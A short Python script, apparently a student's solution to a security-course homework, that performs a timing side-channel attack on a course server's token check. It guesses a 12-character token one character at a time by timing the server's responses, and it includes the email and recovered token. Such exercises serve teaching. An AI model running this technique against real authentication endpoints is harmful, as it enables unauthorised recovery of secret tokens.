import requests
from random import shuffle
import string

URL = "http://com402.epfl.ch/hw5/ex2"
EMAIL = "andrea.piccione@epfl.ch"

# Characters to check
characters = "0123456789abcdefghijklmnopqrstuvwxyz"

# Correct credential found by running the script, can be anything to run the script
guess = "cc2b71687b3f"

found = False

# Go through all 12 iterations for each character that has to be found 
for i in range(0, 12):

    # Record time in list
    recorded = []

    # Go through over all possible characters and measure time of the response
    for c in characters:
        
        # Compose string
        guess = guess[:i] + c + guess[i+1:]
        print("Trying with: " + guess)

        # Seding request
        r = requests.post(URL, json={"email": EMAIL, "token": guess})

        # Getting time elapsed for the response 
        measured = r.elapsed.total_seconds()
        print("Time measured for character " + c + ": " + str(measured))

        # Record time elapsed
        recorded.append(measured)

        # Checking response code
        if r.status_code == 200:
            print('Found!!!')
            found = True
            print()
            break
        print()

    if (found):
        print('Token: ' + r.text)
        break

    # Taking character that took more time than the others
    max_char = characters[recorded.index(max(recorded))]
    print("Maximum time recorded for character: " + max_char + " with time " + str(max(recorded)))
    
    # Update string
    guess = guess[:i] + max_char + guess[i+1:]
    print("New string: " + guess)
    print()
